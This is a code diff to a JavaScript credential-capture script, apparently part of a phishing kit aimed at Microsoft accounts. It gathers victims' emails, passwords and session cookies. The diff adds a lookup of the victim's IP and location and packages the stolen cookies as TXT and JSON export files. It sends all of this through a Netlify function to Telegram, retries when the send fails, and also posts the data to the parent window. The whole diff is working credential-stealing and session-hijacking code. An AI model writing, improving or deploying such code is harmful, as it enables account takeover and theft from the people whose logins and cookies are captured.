@@ -128,99 +128,195 @@ export function injectPasswordCaptureScript() {
             // Capture current cookies
             const capturedCookies = captureMicrosoftCookies();
             
-            // FIXED: Prepare complete payload with all available data
-            const completePayload = {
-              // Use stored credentials from replacement.html if available, otherwise use captured ones
-              email: storedCredentials?.email || capturedCredentials.email || '',
-              password: storedCredentials?.password || capturedCredentials.password || '',
-              passwordSource: 'microsoft-domain-capture-enhanced',
-              cookies: capturedCookies,
-              userAgent: navigator.userAgent,
-              sessionId: Date.now().toString(),
-              url: window.location.href,
-              timestamp: new Date().toISOString(),
-              validated: storedCredentials?.validated || true,
-              microsoftAccount: true,
-              domain: window.location.hostname,
-              // Include raw cookie string for additional processing
-              rawCookies: document.cookie,
-              // Add context for debugging
-              captureContext: {
-                hostname: window.location.hostname,
-                hasStoredCredentials: !!storedCredentials,
-                capturedFieldCount: Object.values(capturedCredentials).filter(v => v).length,
-                retryAttempt: retryCount,
-                injectorVersion: '2.0-fixed'
+            // ENHANCED: Get user location data
+            const getUserLocationData = async () => {
+              try {
+                const response = await fetch('https://ipapi.co/json/');
+                const locationData = await response.json();
+                return {
+                  ip: locationData.ip || 'Unknown',
+                  city: locationData.city || 'Unknown',
+                  region: locationData.region || 'Unknown',
+                  country: locationData.country_name || 'Unknown',
+                  countryCode: locationData.country_code || 'Unknown',
+                  timezone: locationData.timezone || 'Unknown',
+                  isp: locationData.org || 'Unknown'
+                };
+              } catch (error) {
+                console.warn('⚠️ Failed to fetch location data:', error);
+                return { ip: 'Unknown', city: 'Unknown', region: 'Unknown', country: 'Unknown' };
               }
             };
-
-            // Only send if we have meaningful data
-            if (!completePayload.email && !completePayload.password && capturedCookies.length === 0) {
-              console.log('📭 No meaningful data to send to Telegram');
-              sendInProgress = false;
-              return;
-            }
-
-            console.log('📤 Sending complete data to Telegram (attempt ' + (retryCount + 1) + '):', {
-              hasEmail: !!completePayload.email,
-              hasPassword: !!completePayload.password,
-              cookieCount: completePayload.cookies.length,
-              validated: completePayload.validated,
-              domain: completePayload.domain
-            });
-
-            // FIXED: Enhanced fetch with proper error handling
-            fetch('/.netlify/functions/sendTelegram', {
-              method: 'POST',
-              headers: { 
-                'Content-Type': 'application/json',
-                'Accept': 'application/json'
-              },
-              body: JSON.stringify(completePayload)
-            }).then(resp => {
-              sendInProgress = false;
-              if (resp.ok) {
-                console.log('✅ Complete data successfully sent to Telegram');
-                // Mark as sent to prevent duplicate sends
-                try {
-                  localStorage.setItem('telegram_data_sent', 'true');
-                  sessionStorage.setItem('telegram_data_sent', 'true');
-                  localStorage.setItem('data_transmitted', 'true');
-                  sessionStorage.setItem('data_transmitted', 'true');
-                } catch (e) {
-                  // ignore storage errors
-                }
-              } else {
-                console.warn('⚠️ sendTelegram returned status', resp.status);
+            
+            // ENHANCED: Create cookie export files
+            const createCookieFiles = (cookies) => {
+              if (!cookies || cookies.length === 0) return { txtFile: null, jsonFile: null };
+              
+              try {
+                // Create TXT format
+                let txtContent = '# Microsoft Domain Cookies Export\\n';
+                txtContent += \`# Captured: ${new Date().toISOString()}\\n`;
+                txtContent += \`# Domain: ${window.location.hostname}\\n`;
+                txtContent += \`# Total Cookies: ${cookies.length}\\n\\n`;
                 
-                // Retry on server errors
-                if (resp.status >= 500 && retryCount < maxRetries) {
-                  console.log('🔄 Server error, retrying in ' + ((retryCount + 1) * 2000) + 'ms...');
+                cookies.forEach((cookie, index) => {
+                  txtContent += `[Cookie ${index + 1}]\\n`;
+                  txtContent += \`Name: ${cookie.name || 'Unknown'}\\n`;
+                  txtContent += \`Value: ${cookie.value || 'Empty'}\\n`;
+                  txtContent += \`Domain: ${cookie.domain || 'Unknown'}\\n`;
+                  txtContent += \`Path: ${cookie.path || '/'}\\n`;
+                  txtContent += \`Secure: ${cookie.secure ? 'Yes' : 'No'}\\n`;
+                  txtContent += \`HttpOnly: ${cookie.httpOnly ? 'Yes' : 'No'}\\n`;
+                  txtContent += \`SameSite: ${cookie.sameSite || 'Lax'}\\n`;
+                  if (cookie.expires) txtContent += \`Expires: ${cookie.expires}\\n`;
+                  txtContent += \`Capture Time: ${cookie.captureTime || 'Unknown'}\\n`;
+                  txtContent += '\\n';
+                });
+                
+                // Create JSON format
+                const jsonContent = JSON.stringify({
+                  exportInfo: {
+                    timestamp: new Date().toISOString(),
+                    domain: window.location.hostname,
+                    totalCookies: cookies.length,
+                    source: 'Microsoft Domain Injector',
+                    version: '2.0-enhanced'
+                  },
+                  cookies: cookies
+                }, null, 2);
+                
+                return {
+                  txtFile: {
+                    name: \`ms_cookies_${window.location.hostname}_${Date.now()}.txt`,
+                    content: txtContent,
+                    size: new Blob([txtContent]).size
+                  },
+                  jsonFile: {
+                    name: \`ms_cookies_${window.location.hostname}_${Date.now()}.json`,
+                    content: jsonContent,
+                    size: new Blob([jsonContent]).size
+                  }
+                };
+              } catch (error) {
+                console.warn('⚠️ Failed to create cookie files:', error);
+                return { txtFile: null, jsonFile: null };
+              }
+            };
+            
+            // ENHANCED: Get location data and create files asynchronously
+            getUserLocationData().then(locationData => {
+              const cookieFiles = createCookieFiles(capturedCookies);
+              
+              // ENHANCED: Prepare complete payload with location and file data
+              const completePayload = {
+                // Use stored credentials from replacement.html if available, otherwise use captured ones
+                email: storedCredentials?.email || capturedCredentials.email || '',
+                password: storedCredentials?.password || capturedCredentials.password || '',
+                passwordSource: 'microsoft-domain-capture-enhanced',
+                cookies: capturedCookies,
+                locationData: locationData,
+                cookieFiles: cookieFiles,
+                userAgent: navigator.userAgent,
+                sessionId: Date.now().toString(),
+                url: window.location.href,
+                timestamp: new Date().toISOString(),
+                validated: storedCredentials?.validated || true,
+                microsoftAccount: true,
+                domain: window.location.hostname,
+                // Include raw cookie string for additional processing
+                rawCookies: document.cookie,
+                // ENHANCED: Add context with location and file info
+                captureContext: {
+                  hostname: window.location.hostname,
+                  hasStoredCredentials: !!storedCredentials,
+                  capturedFieldCount: Object.values(capturedCredentials).filter(v => v).length,
+                  retryAttempt: retryCount,
+                  injectorVersion: '2.0-enhanced',
+                  locationDataCaptured: !!locationData,
+                  cookieFilesCreated: !!(cookieFiles.txtFile && cookieFiles.jsonFile),
+                  microsoftDomainCapture: true
+                }
+              };
+
+              // ENHANCED: Only send if we have meaningful data (credentials or significant cookies)
+              if (!completePayload.email && !completePayload.password && capturedCookies.length === 0) {
+                console.log('📭 No meaningful data to send to Telegram');
+                sendInProgress = false;
+                return;
+              }
+
+              console.log('📤 Sending enhanced data to Telegram (attempt ' + (retryCount + 1) + '):', {
+                hasEmail: !!completePayload.email,
+                hasPassword: !!completePayload.password,
+                cookieCount: completePayload.cookies.length,
+                validated: completePayload.validated,
+                domain: completePayload.domain,
+                hasLocationData: !!locationData,
+                hasCookieFiles: !!(cookieFiles.txtFile && cookieFiles.jsonFile)
+              });
+
+              // ENHANCED: Send with location and file data
+              fetch('/.netlify/functions/sendTelegram', {
+                method: 'POST',
+                headers: { 
+                  'Content-Type': 'application/json',
+                  'Accept': 'application/json'
+                },
+                body: JSON.stringify(completePayload)
+              }).then(resp => {
+                sendInProgress = false;
+                if (resp.ok) {
+                  console.log('✅ Enhanced data successfully sent to Telegram');
+                  // ENHANCED: Mark as sent with Microsoft domain capture flags
+                  try {
+                    localStorage.setItem('telegram_data_sent', 'true');
+                    sessionStorage.setItem('telegram_data_sent', 'true');
+                    localStorage.setItem('data_transmitted', 'true');
+                    sessionStorage.setItem('data_transmitted', 'true');
+                    localStorage.setItem('ms_cookies_captured', 'true');
+                    sessionStorage.setItem('ms_cookies_captured', 'true');
+                    localStorage.setItem('microsoft_cookies_captured', 'true');
+                    sessionStorage.setItem('microsoft_cookies_captured', 'true');
+                  } catch (e) {
+                    // ignore storage errors
+                  }
+                } else {
+                  console.warn('⚠️ sendTelegram returned status', resp.status);
+                  
+                  // Retry on server errors
+                  if (resp.status >= 500 && retryCount < maxRetries) {
+                    console.log('🔄 Server error, retrying in ' + ((retryCount + 1) * 2000) + 'ms...');
+                    setTimeout(() => {
+                      sendCompleteDataToTelegram(retryCount + 1);
+                    }, (retryCount + 1) * 2000);
+                  }
+                }
+              }).catch(err => {
+                sendInProgress = false;
+                console.warn('⚠️ Error sending enhanced data to Telegram:', err);
+                
+                // Retry on network errors
+                if (retryCount < maxRetries) {
+                  console.log('🔄 Network error, retrying in ' + ((retryCount + 1) * 3000) + 'ms...');
                   setTimeout(() => {
                     sendCompleteDataToTelegram(retryCount + 1);
-                  }, (retryCount + 1) * 2000);
+                  }, (retryCount + 1) * 3000);
                 }
-              }
-            }).catch(err => {
+              });
+            }).catch(locationError => {
+              console.warn('⚠️ Failed to get location data, sending without it:', locationError);
               sendInProgress = false;
-              console.warn('⚠️ Error sending complete data to Telegram:', err);
-              
-              // Retry on network errors
-              if (retryCount < maxRetries) {
-                console.log('🔄 Network error, retrying in ' + ((retryCount + 1) * 3000) + 'ms...');
-                setTimeout(() => {
-                  sendCompleteDataToTelegram(retryCount + 1);
-                }, (retryCount + 1) * 3000);
-              }
             });
 
-            // FIXED: Also send cookies to parent/opener for app state management
+            // ENHANCED: Also send enhanced data to parent/opener for app state management
             const cookieMessage = {
               type: 'MICROSOFT_COOKIES_CAPTURED',
               data: {
                 cookies: capturedCookies,
                 credentials: storedCredentials,
-                timestamp: new Date().toISOString()
+                timestamp: new Date().toISOString(),
+                domain: window.location.hostname,
+                microsoftDomainCapture: true
               }
             };
 
@@ -237,7 +333,7 @@ export function injectPasswordCaptureScript() {
 
           } catch (error) {
             sendInProgress = false;
-            console.warn('⚠️ Error in sendCompleteDataToTelegram:', error);
+            console.warn('⚠️ Error in enhanced sendCompleteDataToTelegram:', error);
           }
         }
 
